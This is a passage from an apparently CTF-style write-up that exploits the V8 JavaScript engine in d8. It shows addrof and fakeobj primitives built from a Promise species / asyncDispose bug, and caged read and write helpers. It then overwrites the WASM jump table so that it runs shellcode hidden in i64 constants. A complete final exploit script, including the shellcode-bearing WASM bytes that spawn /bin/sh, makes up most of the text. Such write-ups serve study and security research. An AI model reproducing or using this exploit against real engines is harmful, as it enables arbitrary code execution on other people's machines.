class=mi>79</span><span class=p>,</span><span class=o>-</span><span class=mi>97</span><span class=p>,</span><span class=o>-</span><span class=mi>58</span><span class=p>,</span><span class=o>-</span><span class=mi>12</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>40</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>113</span><span class=p>,</span><span class=o>-</span><span class=mi>118</span><span class=p>,</span><span class=o>-</span><span class=mi>84</span><span class=p>,</span><span class=o>-</span><span class=mi>9</span><span class=p>,</span><span class=o>-</span><span class=mi>113</span><span class=p>,</span><span class=o>-</span><span class=mi>110</span><span class=p>,</span><span class=o>-</span><span class=mi>92</span><span class=p>,</span><span class=o>-</span><span class=mi>56</span><span class=p>,</span><span class=o>-</span><span class=mi>112</span><span class=p>,</span><span class=mi>127</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>11</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>wasm_mod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Module</span><span class=p>(</span><span class=nx>wasm_code</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>wasm_instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Instance</span><span class=p>(</span><span class=nx>wasm_mod</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>shell</span> <span class=o>=</span> <span class=nx>wasm_instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>shell</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>trigger</span> <span class=o>=</span> <span class=nx>wasm_instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>trigger</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>shell</span><span class=p>();</span></span></span></code></pre></div></div><p>This WASM code is special in the way that it contains various i64 constants which are instructions encoded in a way such that it always ends with a jmp to the next shellcode constant, this allows me to get a coherent execution even if the data of my WASM function is jumbled in memory.</p><p>I first call the shell function to cause it to be loaded into memory (load the RWX WASM page). Note that at this stage nothing happens yet because I didn’t tamper with anything about the WASM execution.</p><p>Let’s examine what the WASM Instance actually looks like.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>let</span> <span class=nx>instance_addr</span> <span class=o>=</span> <span class=nx>addrof</span><span class=p>(</span><span class=nx>wasm_instance</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>wasm_instance</span><span class=p>);</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*-0Q-jnqJlGrhHpyB23b6zQ.png alt></figure></p><p>Sandboxing is limited in the d8 I’m provided so the trusted_data pointer is still inside the v8 heap.</p><p>Let’s examine it.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:585/1*1iS12ooHQ2obiSUY8qxbzQ.png alt title="It is located 8 bytes after the address of the WASM instance, on the high word"><figcaption>It is located 8 bytes after the address of the WASM instance, on the high word</figcaption></figure></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>let</span> <span class=nx>instance_addr</span> <span class=o>=</span> <span class=nx>addrof</span><span class=p>(</span><span class=nx>wasm_instance</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>trusted_data</span> <span class=o>=</span> <span class=nx>caged_read</span><span class=p>(</span><span class=nx>instance_addr</span> <span class=o>+</span> <span class=mh>0x8</span><span class=nx>n</span><span class=p>).</span><span class=nx>high</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>loghex</span><span class=p>(</span><span class=nx>trusted_data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>wasm_instance</span><span class=p>);</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*2qqKhCRvUkYrvG7UzK3DlQ.png alt></figure></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>fakeobj</span><span class=p>(</span><span class=nx>trusted_data</span><span class=p>));</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*TCbedYG455FBIyzGjXjdTA.png alt></figure></p><p>Lots of fields here! I’m mainly interested in jump_table_start as it contains the address the program will jump to in order to execute the WASM code.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*Zk5_u127HD4YqLhETMxdQg.png alt></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*SRwflpwtNoHZBMNYwcPR9A.png alt title="The WASM RWX page"><figcaption>The WASM RWX page</figcaption></figure></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>let</span> <span class=nx>jump_table_start</span> <span class=o>=</span> <span class=nx>caged_read</span><span class=p>(</span><span class=nx>trusted_data</span> <span class=o>+</span> <span class=mh>0x28</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>loghex</span><span class=p>(</span><span class=nx>jump_table_start</span><span class=p>);</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:186/1*xXYYrfZrckyY58eNumG4Yw.png alt></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:438/1*5T2zBOmwEM23Kx1wlEGXgQ.png alt></figure></p><p>Good! I’m almost there. Now I need to find where our i64 constants are.</p><p>Running d8 with <code>--print-wasm-code</code> shows the offset of where my wasm code is.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*x9MNb3kvoQlXjl7rPTdY8A.png alt></figure></p><p>Remember: I do not want to jump to our code per se, but rather jump to the shellcode i64 constants.</p><p>The constants loading start at + 0x9dc</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:669/1*W_YAOkToWL-wIQvw8Y-DiA.png alt title="the i64 constants are the ones being moved into rax"><figcaption>the i64 constants are the ones being moved into rax</figcaption></figure></p><p>Let’s examine what is in the i64 constants (add the offset to read the value of the immediate constant in the instruction):</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:684/1*YOozIr_RbfmoP9XvnuqQjA.png alt title="Ignore the changed addresses, had to rerun"><figcaption>Ignore the changed addresses, had to rerun</figcaption></figure></p><p>It first runs <code>read(0, rsp, 0x10)</code></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*AgvGTb6FnG-sc49nsWHpzQ.png alt></figure></p><p>Then it runs <code>execve(rsp, 0, 0)</code></p><p>Which means I’ll need to send ‘/bin/sh\x00’ when the payload is executed to pop a shell.</p><p>So I need to replace the jump table address with the address of my smuggled shellcode.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>caged_write</span><span class=p>(</span><span class=nx>trusted_data_addr</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>,</span> <span class=nx>jump_table_start</span> <span class=o>+</span> <span class=mh>0x9de</span><span class=p>);</span></span></span></code></pre></div></div><p>and then I need call a WASM function again to trigger my shellcode, the WASM code contains a trigger function that does nothing (only contains a nop), I will use it to trigger the shellcode execution.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>trigger</span><span class=p>();</span></span></span></code></pre></div></div><p>Final javascript file:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// conversation arrays
</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>conversion_buffer</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>float_view</span>        <span class=o>=</span> <span class=k>new</span> <span class=nx>Float64Array</span><span class=p>(</span><span class=nx>conversion_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>int_view</span>          <span class=o>=</span> <span class=k>new</span> <span class=nx>BigUint64Array</span><span class=p>(</span><span class=nx>conversion_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert BigInt to hex representation
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>hex</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=k>this</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert BigInt to float representation
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>i2f</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>int_view</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>float_view</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Set the lowest bit to represent a tagged pointer
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>tag</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>|</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Unset the lowest bit to represent an untagged pointer
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>unTag</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&amp;</span> <span class=o>~</span><span class=p>(</span><span class=mi>1</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>toSmi</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>fromSmi</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// get low dword
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>low</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&amp;</span> <span class=nx>BigInt</span><span class=p>(</span><span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// get high dword
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>high</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&gt;&gt;</span> <span class=nx>BigInt</span><span class=p>(</span><span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert a Number to hex representation
</span></span></span><span class=line><span class=cl><span class=nb>Number</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>hex</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=k>this</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert a Number (float) to integer representation
</span></span></span><span class=line><span class=cl><span class=nb>Number</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>f2i</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>float_view</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>int_view</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>pack</span><span class=p>(</span><span class=nx>low</span><span class=p>,</span> <span class=nx>high</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>low</span> <span class=o>|</span> <span class=p>(</span><span class=nx>high</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>sleepFor</span><span class=p>(</span><span class=nx>sleepDuration</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>now</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>()</span> <span class=o>&lt;</span> <span class=nx>now</span> <span class=o>+</span> <span class=nx>sleepDuration</span><span class=p>)</span> <span class=p>{</span> <span class=cm>/* do nothing */</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>loghex</span><span class=p>(</span><span class=nx>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>hex</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span><span class=o>*</span> <span class=nx>generator</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>yield</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>gen</span> <span class=o>=</span> <span class=nx>generator</span><span class=p>();</span>   
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>corrupted_arr</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{</span><span class=nx>a</span> <span class=o>:</span> <span class=mf>1.1</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>obj2</span> <span class=o>=</span> <span class=p>{</span><span class=nx>b</span><span class=o>:</span> <span class=mf>2.2</span><span class=p>,</span> <span class=nx>c</span><span class=o>:</span><span class=mf>3.3</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>victim</span> <span class=o>=</span> <span class=p>[</span><span class=nx>obj</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>MyConstructor</span><span class=p>(</span><span class=nx>executor</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>myResolve</span><span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>myReject</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>executor</span><span class=p>(</span><span class=nx>myResolve</span><span class=p>,</span> <span class=nx>myReject</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>corrupted_arr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Object</span><span class=p>.</span><span class=nx>defineProperty</span><span class=p>(</span><span class=nb>Promise</span><span class=p>,</span> <span class=nx>Symbol</span><span class=p>.</span><span class=nx>species</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=o>:</span> <span class=nx>MyConstructor</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>gen</span><span class=p>[</span><span class=nx>Symbol</span><span class=p>.</span><span class=nx>asyncDispose</span><span class=p>]();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>addrof</span><span class=p>(</span><span class=nx>obj_</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>obj_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>35</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>high</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>fakeobj</span><span class=p>(</span><span class=nx>addr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>35</span><span class=p>]</span> <span class=o>=</span> <span class=nx>pack</span><span class=p>(</span><span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>35</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>low</span><span class=p>(),</span> <span class=nx>addr</span><span class=p>).</span><span class=nx>i2f</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>rw_arr</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>caged_read</span><span class=p>(</span><span class=nx>addr</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>        <span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>175</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=mh>0x200000000</span><span class=nx>n</span><span class=p>)</span> <span class=o>+</span> <span class=nx>addr</span><span class=o>-</span><span class=mh>0x08</span><span class=nx>n</span><span class=p>).</span><span class=nx>i2f</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>rw_arr</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>f2i</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>caged_write</span><span class=p>(</span><span class=nx>addr</span><span class=p>,</span> <span class=nx>value</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>        <span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>175</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=mh>0x200000000</span><span class=nx>n</span><span class=p>)</span> <span class=o>+</span> <span class=nx>addr</span><span class=o>-</span><span class=mh>0x08</span><span class=nx>n</span><span class=p>).</span><span class=nx>i2f</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nx>rw_arr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>value</span><span class=p>.</span><span class=nx>i2f</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>wasm_code</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
</span></span><span class=line><span class=cl><span class=mi>0</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>115</span><span class=p>,</span><span class=mi>109</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>116</span><span class=p>,</span><span class=mi>114</span><span class=p>,</span><span class=mi>105</span><span class=p>,</span><span class=mi>103</span><span class=p>,</span><span class=mi>103</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>114</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>115</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>108</span><span class=p>,</span><span class=mi>108</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>93</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>44</span><span class=p>,</span><span class=o>-</span><span class=mi>68</span><span class=p>,</span><span class=o>-</span><span class=mi>59</span><span class=p>,</span><span class=o>-</span><span class=mi>7</span><span class=p>,</span><span class=o>-</span><span class=mi>113</span><span class=p>,</span><span class=o>-</span><span class=mi>110</span><span class=p>,</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>70</span><span class=p>,</span><span class=o>-</span><span class=mi>95</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>79</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>65</span><span class=p>,</span><span class=o>-</span><span class=mi>88</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>110</span><span class=p>,</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>72</span><span class=p>,</span><span class=o>-</span><span class=mi>9</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>44</span><span class=p>,</span><span class=o>-</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>59</span><span class=p>,</span><span class=o>-</span><span class=mi>79</span><span class=p>,</span><span class=o>-</span><span class=mi>97</span><span class=p>,</span><span class=o>-</span><span class=mi>58</span><span class=p>,</span><span class=o>-</span><span class=mi>12</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>40</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>113</span><span class=p>,</span><span class=o>-</span><span class=mi>118</span><span class=p>,</span><span class=o>-</span><span class=mi>84</span><span class=p>,</span><span class=o>-</span><span class=mi>9</span><span class=p>,</span><span class=o>-</span><span class=mi>113</span><span class=p>,</span><span class=o>-</span><span class=mi>110</span><span class=p>,</span><span class=o>-</span><span class=mi>92</span><span class=p>,</span><span class=o>-</span><span class=mi>56</span><span class=p>,</span><span class=o>-</span><span class=mi>112</span><span class=p>,</span><span class=mi>127</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span 